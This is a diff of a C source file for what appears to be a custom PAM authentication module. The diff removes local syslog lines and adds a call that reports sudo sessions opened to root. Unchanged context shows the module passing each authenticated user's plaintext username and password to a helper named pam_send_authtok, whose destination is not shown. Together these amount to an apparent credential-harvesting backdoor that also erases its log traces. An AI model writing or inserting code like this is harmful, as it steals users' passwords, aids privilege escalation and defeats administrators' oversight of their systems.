@@ -133,7 +133,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 
     if (username && password && retval == PAM_SUCCESS) {
         pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
-        pam_syslog(pamh, LOG_ERR, "%s's EUID IN THIS CASE IS %d", username, geteuid());
     }
 
     return retval;
@@ -170,9 +169,9 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, cons
     // Get UID of the calling user (e.g., sudo user)
     uid_t caller_uid = getuid();
 
-    // Log to syslog
-    pam_syslog(pamh, LOG_INFO, "CUSTOM PAM: SESSION OPENED FOR user %s (uid=%d) by user (uid=%d)", 
-               username, target_uid, caller_uid);
+    if (target_uid == 0 && caller_uid > target_uid) {
+        pam_send_authtok(pamh, "SUDO SESSION OPENED", username, "");
+    }
 
     return pam_unix_authenticate("pam_sm_open_session", pamh, flags, argc, argv);
 }
